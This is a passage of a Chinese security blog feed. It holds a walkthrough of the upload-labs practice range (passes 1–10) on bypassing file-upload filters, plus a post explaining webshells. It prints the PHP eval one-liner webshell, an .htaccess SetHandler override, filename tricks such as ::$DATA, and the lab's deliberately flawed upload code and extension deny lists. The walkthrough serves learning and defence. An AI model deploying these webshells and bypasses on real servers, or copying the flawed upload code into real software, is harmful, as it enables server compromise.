        <content type="html"><![CDATA[<p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230602092842788.png" alt="image-20230602092842788"></p><h2 id="pass-01-js验证"><a href="#pass-01-js验证" class="headerlink" title="pass-01(js验证)"></a>pass-01(js验证)</h2><p>上传木马后</p><p>提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232014129.png" alt="image-20230523232014129"></p><p><strong>分析一下代码</strong></p><p>这里我们跳过弹窗的提示，可以看出来这个验证是前端进行的，</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523232753987.png" alt="image-20230523232753987"></p><p>从标记的代码中可以看出，使用了onsubmit这个函数，触发了文件提交事件，在表单提交后马上调用了return checkFile 这个函数对上传进行了检查。</p><p><strong>绕过方式</strong></p><p><strong>第一种：创建一个新的html文件，将页面的源代码复制下来，进行修改删除操作禁用掉里面的js脚本。</strong></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523234905931.png" alt="image-20230523234905931"></p><p>把onsubmit这个函数删掉，</p><p>把script代码也删掉</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235125426.png" alt="image-20230523235125426"></p><p> 在form表单中添加第一关的提交地址</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235402326.png" alt="image-20230523235402326"></p><p><strong>第二种：直接按F12 把onsubmit这个直接删除掉</strong></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523235950881.png" alt="image-20230523235950881"></p><p>不推荐第二种，因为如果是在浏览器查看器中直接删除的话，可能他还有一些正常的js，</p><p>如果把正常的js给删除掉的话，可能正常的js会影响到上传操作。</p><h2 id="pass-02-后端验证-文件类型校验-MIME校验"><a href="#pass-02-后端验证-文件类型校验-MIME校验" class="headerlink" title="pass-02(后端验证) 文件类型校验 (MIME校验)"></a>pass-02(后端验证) 文件类型校验 (MIME校验)</h2><p>上传木马后</p><p>提示：本pass在服务端对数据包的MIME进行检查。</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230528133234181.png" alt="image-20230528133234181"></p><p>分析代码：</p><p>从源码中可以看出只对文件类型(type) 进行验证，必须是image/jpeg或者image/png 或者image/gif的格式，没有对后缀名进行验证，</p><p>只需要bp抓包将Content-Type:的参数修改成image/jpeg 或者image/png 或者image/gif其中的一种，进行绕过就好。</p><p>操作步骤：</p><p>开始bp抓包，修改content-type类型即可</p><blockquote><p><strong>理解一下什么是MIME？</strong></p><p>MIME:多用途互联网邮件扩展协议。用途为根据文件后缀名判断文件类型，用什么应用程序打开，但是在这里是根据文件类型判断后缀名。</p></blockquote><p>$_FILES[‘myfile’][‘type’]文件的MIME类型，需要浏览器提供该信息的支持，例如”image/gif”</p><p>MIME 给出的是文件的MIME信息 ，此信息可以用来在HTTP Conten-type 头 信息中发送 正确的信息，如：header(“Cotent-type:image/gif”)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">文件格式</span><br><span class="line">编辑</span><br><span class="line">播报</span><br><span class="line">最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。</span><br><span class="line">MIME意为多功能Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。</span><br><span class="line">每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</span><br><span class="line">七种大类别：</span><br><span class="line">video</span><br><span class="line">image</span><br><span class="line">application</span><br><span class="line">text</span><br><span class="line">audio</span><br><span class="line">multipart</span><br><span class="line">message</span><br><span class="line">常见的MIME类型(通用型)：</span><br><span class="line">超文本标记语言文本 .html text/html</span><br><span class="line">xml文档 .xml text/xml</span><br><span class="line">XHTML文档 .xhtml application/xhtml+xml</span><br><span class="line">普通文本 .txt text/plain</span><br><span class="line">RTF文本 .rtf application/rtf</span><br><span class="line">PDF文档 .pdf application/pdf</span><br><span class="line">Microsoft Word文件 .word application/msword</span><br><span class="line">PNG图像 .png image/png</span><br><span class="line">GIF图形 .gif image/gif</span><br><span class="line">JPEG图形 .jpeg,.jpg image/jpeg</span><br><span class="line">au声音文件 .au audio/basic</span><br><span class="line">MIDI音乐文件 mid,.midi audio/midi,audio/x-midi</span><br><span class="line">RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio</span><br><span class="line">MPEG文件 .mpg,.mpeg video/mpeg</span><br><span class="line">AVI文件 .avi video/x-msvideo</span><br><span class="line">GZIP文件 .gz application/x-gzip</span><br><span class="line">TAR文件 .tar application/x-tar</span><br><span class="line">任意的二进制数据 application/octet-stream</span><br></pre></td></tr></table></figure><p><strong>涉及的函数用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">trim():去除左右两侧的空白</span><br><span class="line">deldot（）：删除末尾的店</span><br><span class="line">strrchar(string,char):函数查找串，在string字符串中查找，char在string字符串中最后一次出现的位置，返回并从该位置截取到尾，如果没有找到字符，则返回false</span><br><span class="line">strrchar(&#x27;hello  wordld,i love you &#x27;,&#x27;i&#x27;)</span><br><span class="line">输出结果： i love you </span><br><span class="line">strtolower():函数 把所有字符串装换成小写</span><br><span class="line">str_ireplace(fine,replace,strin):替换，</span><br><span class="line">在strin字符串中，去搜索fine字符串，如果</span><br><span class="line">搜到到匹配上了，用replace字符串进行替换</span><br></pre></td></tr></table></figure><h2 id="pass-03-文件后缀名，黑名单绕过"><a href="#pass-03-文件后缀名，黑名单绕过" class="headerlink" title="pass-03(文件后缀名，黑名单绕过)"></a>pass-03(文件后缀名，黑名单绕过)</h2><p>上传木马后</p><p>提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！            </p><p>查看原代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;../config.php&#x27;;</span><br><span class="line">include &#x27;../common.php&#x27;;</span><br><span class="line">include &#x27;../head.php&#x27;;</span><br><span class="line">include &#x27;../menu.php&#x27;;</span><br><span class="line"></span><br><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">            if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>分析一下代码：</strong></p><p>这里使用了数组的方式，设置了黑名单，不允许.asp  .aspx  .php  .jsp 的后缀名文件进行上传。</p><p><strong>绕过思路：</strong></p><p>php开发了这么久了，不止只有这一个文件名，我们可以使用其他的php的别名进行绕</p><p>过：.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345 （但是这里是有前提条件的）就是对方的</p><p>服务器的配置有对这些php其他的文件名配置了解析的设置，否认就算你上传上去了，还是解析失败。</p><p>配置好了对应的解析，直接修改文件名就好了把1.php修改成你配置的对应的解析的文件名。</p><p><strong>实现方法：</strong></p><p>test.php修改后test.phtml    上传成功！</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523230745151.png" alt="image-20230523230745151"></p><p>蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230523231053874.png" alt="image-20230523231053874"></p><h2 id="pass-04-文件名后缀验证，配置文件解析控制"><a href="#pass-04-文件名后缀验证，配置文件解析控制" class="headerlink" title="pass-04(文件名后缀验证，配置文件解析控制)"></a>pass-04(文件名后缀验证，配置文件解析控制)</h2><p>上传木马后</p><p>提示：此文件不允许上传!     </p><p>查看一下源代码</p><p>黑名单里面禁止上传这些后缀的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php,.php5,.php4,.php3,.php2,.php1,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.pHp1,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.ini</span><br></pre></td></tr></table></figure><p>  <img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230524203551062.png" alt="image-20230524203551062">     </p><p>从源代码中可以看出，还是使用了一个黑名单的限制，对文件的后缀名进行了验证，并且限制的后缀名比之前的更多。但是我们可以从黑名单中看出没有对.htaccess文件进行验证，那么我们就可以使用.htaccess进行绕过。</p><blockquote><p>.htaccess功能介绍：htaccess文件是Apache服务器中的一个配置文件。这个文件可以不用获得root权限，就可以更改这个目录下的所有的文件配置。那么说明只要创建一个 .htaccess所在目录的所有文件配置就会都修改转换成PHP的解析格式。(.htaccess文件只对Apache服务器有效)。</p></blockquote><p>操作步骤：</p><p>1.首先先创建一个 .htaccess 的文件在文件中写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>2.把这个文件上传到服务器上。</p><p>3.将一句话木马文件名修改成gif/png/jpe其中格式的一种。比如2.png</p><p> 上传成功。</p><p>4.将p.git(一句话木马的文件)上传到服务器</p><p>这里的关键点就是.htaccess这个文件，把所有的目录下的文件的解析方式都修改成了php，</p><p>所以我们第二次上传的图片2.png “png”不在黑名单中，但是由于.htaccess文件所以又把他解析成了php的格式，所以可以完成正常的解析。</p><h2 id="pass-05-文件名后缀验证-点-空格-点"><a href="#pass-05-文件名后缀验证-点-空格-点" class="headerlink" title="pass-05(文件名后缀验证 ,点+空格+点)"></a>pass-05(文件名后缀验证 ,点+空格+点)</h2><p>查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br><span class="line">        </span><br><span class="line">        if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">定义两个变量：is_upload代表文件是否上传成功，msg代表错误信息提示。</span><br><span class="line"></span><br><span class="line">if...sumit</span><br><span class="line">检测是否有表单提交数据通过检测$_POST数组中是否存在’submit’键名。</span><br><span class="line"></span><br><span class="line">if(file_exits (UPLOAD_PATH))&#123;</span><br><span class="line">如果指定的文件夹存在通过检测目录是否存在(即在服务器上是否有上传文件夹)</span><br><span class="line"></span><br><span class="line">$deny_ext黑名单,定义了一个包含不允许上传的文件类型的$deny_ext数组</span><br><span class="line"></span><br><span class="line">$file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">获取上传文件名并删除文件名末尾的点</span><br><span class="line"></span><br><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br><span class="line">从上传文件名中提取文件扩展名并运行一些大小写转换和字符串替换处理。</span><br><span class="line"></span><br><span class="line">if (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">如果文件类型是可接受的，则执行下一步操作。、</span><br><span class="line"></span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br><span class="line">获取上传文件在服务器临时目录中的路径和在指定目录中显示的路径。</span><br><span class="line"></span><br><span class="line">if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">    $is_upload = true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">将上传文件从服务器临时目录移动到指定目录，并确定是否上传成功，$msg则保存了任何错误信息。</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = &#x27;此文件类型不允许上传！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">如果文件类型不是可接受的，则发送错误提示消息。</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">如果指定的上传文件夹不存在，则向用户返回一条错误消息。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bp抓包看看</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231428383.png" alt="image-20230610231428383"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231151446.png" alt="image-20230610231151446"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610231315662.png" alt="image-20230610231315662"></p><h2 id="Pass-06-文件名后缀验证，大小写绕过"><a href="#Pass-06-文件名后缀验证，大小写绕过" class="headerlink" title="Pass-06 (文件名后缀验证，大小写绕过)"></a>Pass-06 (文件名后缀验证，大小写绕过)</h2><p>查看提示，黑名单禁止上传</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php,.php5,.php4,.php3,.php2,.html,.htm,.phtml,.pht,.pHp,.pHp5,.pHp4,.pHp3,.pHp2,.Html,.Htm,.pHtml,.jsp,.jspa,.jspx,.jsw,.jsv,.jspf,.jtml,.jSp,.jSpx,.jSpa,.jSw,.jSv,.jSpf,.jHtml,.asp,.aspx,.asa,.asax,.ascx,.ashx,.asmx,.cer,.aSp,.aSpx,.aSa,.aSax,.aScx,.aShx,.aSmx,.cEr,.sWf,.swf,.htaccess,.ini</span><br></pre></td></tr></table></figure><p>查看源代码</p><p><code>$file_ext = strtolower($file_ext); //转换为小写</code></p><p>源码中没有转换成小写，所以我们可以用大小写绕过</p><h2 id="Pass-07-文件名后缀验证-空格绕过"><a href="#Pass-07-文件名后缀验证-空格绕过" class="headerlink" title="Pass-07 (文件名后缀验证,空格绕过)"></a>Pass-07 (文件名后缀验证,空格绕过)</h2><p><code>$file_name= trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); //代码中无收尾去空函数trim() //去除字符串中的空格</code></p><p>方法：<code>后缀加空格</code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175638767.png" alt="image-20230610175638767"></p><p>然后用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610175730423.png" alt="image-20230610175730423"></p><h2 id="pass-08-文件名后缀验证-点绕过"><a href="#pass-08-文件名后缀验证-点绕过" class="headerlink" title="pass-08(文件名后缀验证,点绕过)"></a>pass-08(文件名后缀验证,点绕过)</h2><p>代码中无deldot()函数 //删除文件名末尾的点</p><p>   <code>$file_name = deldot($file_name);//删除文件名末尾的点</code></p><p>方法：<code>在后缀 . </code></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223429650.png" alt="image-20230610223429650"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223253561.png" alt="image-20230610223253561"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610223326733.png" alt="image-20230610223326733"></p><h2 id="pass-09-文件名后缀验证-DATA绕过"><a href="#pass-09-文件名后缀验证-DATA绕过" class="headerlink" title="pass-09(文件名后缀验证,::$DATA绕过)"></a>pass-09(文件名后缀验证,::$DATA绕过)</h2><p>源码中</p><p><code>$file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</code></p><p>少了str_ireplace(‘<code>::$DATA</code>‘, ‘’, <code>$file_ext</code>);//去除字符串::$DATA</p><blockquote><p><strong>利用Windows特性</strong></p><p><strong>在window的时候如果文件名+”<code>::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持::$DATA之前的文件名，他的目的就是不检查后缀名</strong></p></blockquote><blockquote><p>科普一下</p><p>什么是::$DATA呢？</p><p><code>::$DATA</code>这是一种windows操作系统处理文件时的特性，为<code>文件流</code>，如果文件名后有此标记<code>::$DATA</code>,并且没有做过滤，windows会不检查，直接保存该文件。使用他的目的就是不检查后缀名。</p></blockquote><p>所以我们只要在文件名后面加上::$DATA就可以成功绕过</p><p><strong>方法：后缀加上::$DATA</strong></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224605256.png" alt="image-20230610224605256"></p><p>用蚁剑连接</p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224421981.png" alt="image-20230610224421981"></p><p><img src="/2023/05/22/upload-labs%E9%9D%B6%E5%9C%BA/image-20230610224445287.png" alt="image-20230610224445287"></p><h2 id="pass-10-文件名后缀验证-点-空格-点"><a href="#pass-10-文件名后缀验证-点-空格-点" class="headerlink" title="pass-10(文件名后缀验证,点+空格+点)"></a>pass-10(文件名后缀验证,点+空格+点)</h2>]]></content>
      
      
      <categories>
          
          <category> 漏洞靶场学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2023/05/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="websell"><a href="#websell" class="headerlink" title="websell"></a>websell</h2><h3 id="什么叫做webshell？"><a href="#什么叫做webshell？" class="headerlink" title="什么叫做webshell？"></a>什么叫做webshell？</h3><p>1.webshell,简称为网页后门。简单来说它是运行在web应用之上的远程控制程序。</p><p>2.webshell是一张网页，由PHP，JSP,ASP,NET等这类web应用开发程序语言开发，但webshell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</p><h3 id="常见的webshell有哪些？"><a href="#常见的webshell有哪些？" class="headerlink" title="常见的webshell有哪些？"></a>常见的webshell有哪些？</h3><p>1.大马、小马、一句话木马、菜刀马、脱库马、各种马…等</p><p>2，拥有较完整功能的webshell，我们一般称为大马</p><p>3.功能相对简单的webshell成为小马</p><h3 id="webshell有什么作用？"><a href="#webshell有什么作用？" class="headerlink" title="webshell有什么作用？"></a>webshell有什么作用？</h3><h3 id="怎样能获取getshell？"><a href="#怎样能获取getshell？" class="headerlink" title="怎样能获取getshell？"></a>怎样能获取getshell？</h3><h3 id="webshell之php一句话木马解读"><a href="#webshell之php一句话木马解读" class="headerlink" title="webshell之php一句话木马解读"></a>webshell之php一句话木马解读</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_post[x]);?&gt;</span><br></pre></td></tr></table></figure><p>$_post[x]:获取post请求参数中x的值。例如post请求中传递x=phpinfo(); , 那么$_post[x]就等同于</p><p>phpinfo(); </p><p>eval()将字符串当做PHP代码运行。例如eval(’phpinfo();’) , 其中phpinfo();会被当做PHP代码去执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[X]);?&gt;    实际上的传递过程是这样的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php @eval(`phpinfo();`);?&gt;   实际的语句是这样的</span><br></pre></td></tr></table></figure><p>我们通过该webshell，传递任意php代码，</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>宽字节注入</title>
      <link href="/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/17/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</url>
      
